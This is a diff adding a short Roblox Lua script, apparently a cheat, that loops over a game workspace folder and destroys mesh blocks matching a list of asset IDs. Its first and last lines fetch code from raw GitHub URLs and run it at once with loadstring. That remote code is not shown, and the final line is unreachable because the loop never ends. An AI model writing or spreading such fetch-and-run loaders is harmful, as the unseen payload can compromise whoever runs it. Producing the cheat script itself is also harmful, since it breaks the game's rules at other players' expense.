@@ -1,0 +1,32 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/San1na/Soso/refs/heads/main/pasha_pidr"))()
+
+while true do
+     local folder = workspace.__THINGS.BlockWorlds.Blocks_8
+local targetMeshIds = {
+    "rbxassetid://108190463667826",
+    "rbxassetid://110373471085083",
+    "rbxassetid://103544790460474",
+    "rbxassetid://96246511698009",
+    "rbxassetid://108190463667826",
+    "rbxassetid://80823997843474",
+    "rbxassetid://85149779982216",
+    "rbxassetid://92644618517298",
+    "rbxassetid://85878564976774"
+}
+ 
+     for _, part in ipairs(folder:GetChildren()) do
+         if part:IsA("MeshPart") then
+             for _, meshId in ipairs(targetMeshIds) do
+                 if part.MeshId == meshId then
+
+                                        part:Destroy()  -- Удаляем блок
+                     break
+                 end
+             end
+         end
+     end
+     task.wait(1) -- Задержка в 1 секунду перед следующим циклом
+ end
+wait(1)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/San1na/Soso/refs/heads/main/Pasha_Gandon"))()
